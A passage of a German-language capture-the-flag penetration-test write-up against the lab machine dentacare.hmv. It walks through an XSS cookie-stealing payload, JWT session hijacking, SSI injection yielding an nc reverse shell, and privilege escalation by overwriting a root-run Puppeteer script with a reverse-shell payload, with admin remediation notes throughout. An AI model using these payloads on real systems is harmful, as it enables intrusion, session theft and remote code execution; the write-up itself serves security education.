+            <p class="analysis">**Analyse:** Wir konstruieren einen XSS-Payload. Das `<img>`-Tag mit einer ungültigen Quelle (`src=x`) löst das `onerror`-Ereignis aus. Der JavaScript-Code im `onerror`-Handler setzt die `src` des Bildes dynamisch auf die URL unseres Servers (`http://192.168.2.199:8888/`) und hängt den Inhalt von `document.cookie` als GET-Parameter `c` an.
+            Wir starten einen einfachen Python-HTTP-Server als Listener auf Port 8888. Wir *nehmen an*, dass der XSS-Payload erfolgreich in die `/comment`-Funktion injiziert wurde (z.B. als Kommentar gespeichert) und dass ein anderer Benutzer (wahrscheinlich ein Administrator oder ein automatisierter Prozess wie ein Bot) die Seite besucht hat, auf der der Kommentar angezeigt wird. Dadurch wird der XSS-Payload im Browser des Opfers ausgeführt. Unser Listener empfängt eine Anfrage, die den Cookie des Opfers enthält: `<span class="password">Authorization=eyJ...JnQ</span>`. Es handelt sich um einen JWT (JSON Web Token).</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Ausnutzung einer (vermuteten) Stored XSS-Schwachstelle in der Kommentarfunktion. Wir haben den `Authorization`-Cookie (JWT) eines anderen Benutzers gestohlen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den gestohlenen JWT analysieren (z.B. mit jwt.io), um Informationen über den Benutzer zu erhalten. Versuchen, diesen Cookie im eigenen Browser zu setzen, um die Sitzung des Opfers zu übernehmen.
+            **Empfehlung (Admin):** Eine strikte Input-Validierung und Output-Encoding in der Kommentarfunktion implementieren, um XSS zu verhindern. Cookies, die nicht von JavaScript gelesen werden müssen, mit dem `HttpOnly`-Flag versehen (dies hätte diesen spezifischen Angriff verhindert).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">JWT Analyse (mit jwt.io)</span></div>
+                    <pre>
+# Header:
+{
+  "typ": "JWT",
+  "alg": "HS512"
+}
+# Payload (Decoded):
+{
+  "iss": "DentaCare Corporation ",
+  "iat": 1712574512,
+  "exp": 1744110512,
+  "aud": "dentacare.hmv",
+  "sub": "helpdesk@dentacare.hmv",
+  "GivenName": "Patrick",
+  "Surname": "Petit",
+  "Email": "<span class="command">admin@dentacare.hmv</span>",
+  "Role": [
+    "<span class="command">Administrator</span>",
+    "Project Administrator"
+  ]
+}
+# Signature: (Cannot be verified without the secret key)
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir dekodieren den Payload-Teil des gestohlenen JWT. Er enthält Informationen über den Benutzer, einschließlich der E-Mail-Adresse (`<span class="command">admin@dentacare.hmv</span>`) und der Rollen (`<span class="command">Administrator</span>`, `Project Administrator`). Der Token wurde mit HS512 signiert.</p>
+            <p class="evaluation">**Bewertung:** Der gestohlene Cookie gehört eindeutig einem Administrator. Dies bestätigt den Wert des gestohlenen Tokens.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Cookie im Browser setzen (z.B. mit Cookie-Editor) und versuchen, auf den `/admin`-Endpunkt zuzugreifen.
+            **Empfehlung (Admin):** JWTs mit starken, geheimen Schlüsseln signieren. Kurze Ablaufzeiten (exp) verwenden. Sensible Informationen nicht unnötig im JWT-Payload speichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Aktion im Webbrowser (Session Hijacking)</span></div>
+                    <pre>
+# 1. Browser-Erweiterung "Cookie-Editor" (oder ähnlich) verwenden.
+# 2. Einen neuen Cookie für die Domain `dentacare.hmv` erstellen.
+#    Name: <span class="command">Authorization</span>
+#    Wert: <span class="password">eyJ0eXA...JnQ</span> (Der vollständige gestohlene JWT)
+# 3. Speichern des Cookies.
+# 4. Aufrufen von <span class="command">http://dentacare.hmv/admin</span>
+# Ergebnis: <span class="password">Umleitung (Redirect)</span> auf <span class="command">http://dentacare.hmv:8000/</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir verwenden eine Browser-Erweiterung, um den gestohlenen `Authorization`-JWT-Cookie für die Domain `dentacare.hmv` zu setzen. Anschließend versuchen wir, auf den `/admin`-Endpunkt zuzugreifen. Da wir nun einen gültigen Admin-Cookie senden, erkennt uns die Anwendung als Administrator an. Statt einer Login-Seite oder einer Fehlermeldung werden wir auf den Apache-Server auf Port 8000 umgeleitet.</p>
+             <p class="evaluation">**Bewertung:** Session Hijacking war erfolgreich! Wir haben administrativen Zugriff auf eine Schnittstelle erlangt, die auf Port 8000 läuft. Dies erklärt möglicherweise den 403-Fehler, den wir zuvor auf Port 8000 sahen – der Zugriff erfordert wahrscheinlich diesen Admin-Cookie.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Anwendung auf Port 8000 gründlich untersuchen. Nach Möglichkeiten zur Codeausführung oder zum Lesen sensibler Daten suchen.
+             **Empfehlung (Admin):** Session-Management härten. Schutzmechanismen gegen Session-Hijacking implementieren (z.B. User-Agent-Prüfung, IP-Adressbindung - kann aber zu Usability-Problemen führen). XSS verhindern, um den Cookie-Diebstahl an erster Stelle zu unterbinden.</p>
+        </section>
+
+        <section id="ssi-rce">
+             <h2>SSI RCE & Low Privilege Shell</h2>
+             <p class="comment">Wir haben nun Zugriff auf die Anwendung auf Port 8000 (Apache). Wir untersuchen diese Anwendung auf Schwachstellen, um eine Codeausführung zu erreichen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Interaktion mit der Anwendung auf Port 8000</span></div>
+                    <pre>
+# Aufruf von http://dentacare.hmv:8000/ (mit Admin-Cookie)
+# Untersuchung des Quellcodes (view-source:http://dentacare.hmv:8000/):
+[...]
+    <h2>Accounts Receivable Management Portal</h2>
+     form action="<span class="command">gen.php</span>" method="<span class="command">get</span>" 
+       type="text" name="<span class="command">cmd</span>" placeholder="Name of debtor patient " 
+    
+    < 
+[...]
+
+# Test der Formularfunktion:
+# Eingabe "root" in das Feld -> Submit
+# Aufruf von http://dentacare.hmv:8000/patient_name.shtml (Vermutung, wo die Ausgabe landet)
+# Inhalt von patient_name.shtml:
+Patient with unpaid balance added to database :
+"<span class="command">root</span>"
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die Seite auf Port 8000 enthält ein Formular mit dem Namen "Accounts Receivable Management Portal". Das Formular sendet eine GET-Anfrage an `gen.php` mit dem Parameter `cmd`, der den eingegebenen Patientennamen enthält. Wenn wir "root" eingeben, erscheint dieser Text später auf einer Seite namens `patient_name.shtml`. Dies deutet darauf hin, dass der Inhalt des `cmd`-Parameters in diese `.shtml`-Datei geschrieben wird.</p>
+             <p class="evaluation">**Bewertung:** Die Dateiendung `.shtml` ist ein starker Hinweis auf die Verwendung von Server-Side Includes (SSI) durch den Apache-Server. Wenn der Input aus dem `cmd`-Parameter nicht korrekt gefiltert wird, bevor er in die `.shtml`-Datei geschrieben wird, könnten wir SSI-Direktiven injizieren.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen, eine SSI-Injection-Payload in das Formularfeld einzugeben, z.B. `<!--#exec cmd="id" -->`. Anschließend die Seite `patient_name.shtml` überprüfen, um zu sehen, ob der Befehl `id` ausgeführt wurde.
+             **Empfehlung (Admin):** Benutzereingaben, die in SSI-fähige Dateien geschrieben werden, rigoros filtern und escapen. Idealerweise SSI deaktivieren (`Options -Includes`), wenn nicht unbedingt erforderlich.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                    <div class="prompt"># <span class="command">SSI Injection Test</span></div>
+                    <pre>
+# Eingabe im Formular auf http://dentacare.hmv:8000/:
+<span class="password"><!--#exec cmd="id" --></span>
+
+# Aufruf von http://dentacare.hmv:8000/patient_name.shtml
+# Inhalt von patient_name.shtml:
+Patient with unpaid balance added to database :
+"<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> "
+                    </pre>
+                  </div>
+             </div>
+            <p class="analysis">**Analyse:** Wir geben die SSI-Direktive `<!--#exec cmd="id" -->` in das Formular ein. Beim anschließenden Aufruf von `patient_name.shtml` sehen wir die Ausgabe des `id`-Befehls. Dies bestätigt die SSI-Injection-Schwachstelle.</p>
+            <p class="evaluation">**Bewertung:** Kritische RCE-Schwachstelle durch SSI-Injection bestätigt. Wir können nun beliebige Befehle als der Benutzer ausführen, unter dem der Apache-Server läuft (hier `www-data`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die SSI-Injection nutzen, um eine Reverse Shell zu erhalten.
+            **Empfehlung (Admin):** SSI-Injection-Schwachstelle sofort beheben (Input-Filterung, SSI deaktivieren).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">SSI Reverse Shell Payload</span></div>
+                     <pre>
+# Eingabe im Formular auf http://dentacare.hmv:8000/:
+<span class="password"><!--#exec cmd="nc -e /bin/bash 192.168.2.199 4444" --></span>
+                     </pre>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.114] 56614</span>
+<span class="command"># Shell als www-data erhalten!</span>
+                     </pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt">www-data@dentacare:/var/www/html  <span class="command">stty rows 48 columns 94</span></div>
+                     <div class="prompt">www-data@dentacare:/var/www/html <span class="command">id</span></div>
+                     <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+                     </pre>
+                     <div class="prompt">www-data@dentacare:/var/www/html  <span class="command">ls /home/</span></div>
+                     <pre>
+<span class="command">dentist</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir starten einen Netcat-Listener auf unserer Maschine (Port 4444). Wir injizieren eine SSI-Direktive, die Netcat (`nc -e /bin/bash`) verwendet, um eine Reverse Shell zu unserem Listener zu starten. Nach Absenden des Formulars und Aufruf von `patient_name.shtml` (oder automatischer Ausführung) erhalten wir eine Verbindung auf unserem Listener. Der `id`-Befehl bestätigt, dass wir eine Shell als `www-data` haben. Wir stabilisieren die Shell grob mit `stty` und sehen, dass ein Benutzer `dentist` existiert.</p>
+             <p class="evaluation">**Bewertung:** Erfolgreicher initialer Zugriff als `www-data` über SSI-Injection auf dem Apache-Server (Port 8000).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell vollständig stabilisieren. Nach Privilege-Escalation-Vektoren suchen.
+             **Empfehlung (Admin):** SSI-Schwachstelle beheben.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Puppeteer Script)</h2>
+            <p class="comment">Wir haben eine Shell als `www-data`. Wir suchen nach Möglichkeiten zur Rechteerweiterung, indem wir das Dateisystem und laufende Prozesse untersuchen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@dentacare:/var/www/html <span class="command">cd /opt/appli/.config</span></div>
+                     <div class="prompt">www-data@dentacare:/opt/appli/.config  <span class="command">ls</span></div>
+                     <pre>
+<span class="command">read_comment.js</span>
+                     </pre>
+                     <div class="prompt">www-data@dentacare:/opt/appli/.config$ <span class="command">cat read_comment.js</span></div>
+                     <pre>
+ 
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: ['<span class="password">--no-sandbox</span>', '--disable-setuid-sandbox'] // Wichtiger Hinweis!
+    });
+    const page = await browser.newPage();
+
+    const cookies = [{
+        'name': 'Authorization',
+        'value': '<span class="password">eyJ0eXA...JnQ</span>', // Das Admin JWT!
+        'url': 'localhost:80'
+    }];
+
+    await page.setCookie(...cookies);
+
+    await page.goto('<span class="command">localhost:80/view-all-comments</span>'); // Besucht die Kommentar-Seite
+
+    console log(`Page visitée avec cookie spécifié à ${new Date().toISOString()}`);
+ 
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Wir finden im Verzeichnis `/opt/appli/.config` ein Node.js-Skript namens `read_comment.js`. Dieses Skript verwendet `puppeteer` (ein Tool zur Steuerung von Headless Chrome/Chromium), um eine Webseite zu besuchen. Wichtige Details:
+             *   Es startet den Browser mit der Option `<span class="password">--no-sandbox</span>`. Dies ist oft notwendig, wenn Puppeteer als Root ausgeführt wird, ist aber ein Sicherheitsrisiko.
+             *   Es setzt den `<span class="password">admin JWT-Cookie</span>`, den wir zuvor gestohlen haben, für `localhost:80`.
+             *   Es navigiert zu `<span class="command">http://localhost:80/view-all-comments</span>`, vermutlich um die Seite zu rendern oder zu prüfen, auf der die Kommentare angezeigt werden (und wo unser XSS ausgelöst wurde).
+             *   Es wartet 10 Sekunden.
+             Dieses Skript wird wahrscheinlich durch einen automatisierten Prozess (Cronjob, Systemd-Timer) regelmäßig ausgeführt, vermutlich um die Kommentarfunktion zu überprüfen oder zu moderieren.</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein exzellenter Privilege-Escalation-Vektor! Da das Skript wahrscheinlich mit höheren Rechten (möglicherweise `root`, wegen `--no-sandbox`) ausgeführt wird und wir als `www-data` Schreibrechte auf das Skript oder sein Verzeichnis haben (Annahme, muss geprüft werden, ist aber wahrscheinlich, da wir es überschreiben können), können wir das Skript manipulieren, um Code als dieser höher privilegierte Benutzer auszuführen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Prüfen, mit welchen Rechten wir auf `read_comment.js` zugreifen können (`ls -l`). Wenn wir Schreibrechte haben, eine Sicherungskopie erstellen und das Skript mit einem eigenen Payload (z.B. Reverse Shell) überschreiben. Einen Listener starten und warten, bis der automatisierte Prozess das Skript ausführt.
+              **Empfehlung (Admin):** Automatisierte Aufgaben mit dem Prinzip der geringsten Rechte ausführen. `--no-sandbox` nur verwenden, wenn absolut unvermeidlich und die Umgebung sicher ist. Dateiberechtigungen für Skripte und Konfigurationen härten. Code-Reviews durchführen.</p>
+
+              <p class="comment">Wir haben Schreibrechte auf das Skript und ersetzen seinen Inhalt durch einen Reverse-Shell-Payload.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">www-data@dentacare:/opt/appli/.config$ <span class="command">cp read_comment.js read_comment.js.bak</span></div>
+                      <div class="prompt">www-data@dentacare:/opt/appli/.config$ <span class="command">echo 'require("child_process").exec("nc -e /bin/bash 192.168.2.199 2345")' > read_comment.js</span></div>
+                      <div class="prompt"># <span class="command">(Listener auf Port 2345 in anderem Terminal starten)</span></div>
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 2345</span></div>
+                      <pre>
+listening on [any] 2345 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.114] 42170</span>
+<span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Wir erstellen zuerst eine Sicherungskopie des Originalskripts. Dann überschreiben wir `read_comment.js` mit einem einfachen Node.js-Befehl, der `child_process.exec` verwendet, um eine Netcat-Reverse-Shell (`nc -e /bin/bash`) zu unserer IP (`192.168.2.199`) auf Port `2345` zu starten. Wir starten einen Listener auf diesem Port. Kurz darauf (vermutlich beim nächsten Ausführungsintervall des Cronjobs/Timers) erhalten wir eine Verbindung. Der `id`-Befehl bestätigt, dass die Shell als `<span class="command">root</span>` läuft.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu `root` erfolgreich! Die Manipulation des automatisiert ausgeführten Puppeteer-Skripts war der Schlüssel.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Root-Rechte bestätigt. Flags suchen und auslesen. Das Originalskript (`read_comment.js.bak`) wiederherstellen, um das System nicht unnötig zu stören (optional, je nach Engagement-Regeln).
+               **Empfehlung (Admin):** **Schwachstelle dringend beheben!** Berechtigungen für das Skript und das Verzeichnis korrigieren. Den automatisierten Task überprüfen und mit minimalen Rechten ausführen lassen.</p>
+
+               <p class="comment">Als Root lesen wir die Flags.</p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt"># <span class="command">ls /root</span></div>
+                       <pre>
+<span class="command">r00t.txt</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">cat /root/r00t.txt</span></div>
+                       <pre>
+<span class="password">31b80e67e233ed342639f36b10ecb64d</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">cd /home</span></div>
+                       <div class="prompt"># <span class="command">ls</span></div>
+                       <pre>
+<span class="command">dentist</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">cd dentist</span></div>
+                       <div class="prompt"># <span class="command">ls</span></div>
+                       <pre>
+<span class="command">user.txt</span>
+                       </pre>
+                       <div class="prompt"># <span class="command">cat user.txt</span></div>
+                       <pre>
+<span class="password">ef2f3bab2950c28547e17d32f864f172</span>
+                       </pre>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:** In der Root-Shell finden wir die Root-Flag in `/root/r00t.txt` und die User-Flag im Home-Verzeichnis des Benutzers `dentist` (`/home/dentist/user.txt`).</p>
+                <p class="evaluation">**Bewertung:** Beide Flags erfolgreich ausgelesen.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Bericht abschließen.
+                **Empfehlung (Admin):** Alle identifizierten Schwachstellen (Werkzeug Debugger Exposure, mangelnde XSS-Prävention, unsichere Session-Cookies, SSI Injection, unsichere Konfiguration/Berechtigungen des Puppeteer-Skripts) beheben.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/dentist/user.txt</div>
+                    <div class="flag-value"><span class="password">ef2f3bab2950c28547e17d32f864f172</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/r00t.txt</div>
+                    <div class="flag-value"><span class="password">31b80e67e233ed342639f36b10ecb64d</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 6. August 2024</p> <!-- Datum aus Nmap-Scan extrahiert -->
+    </footer>
+</body>
+</html>
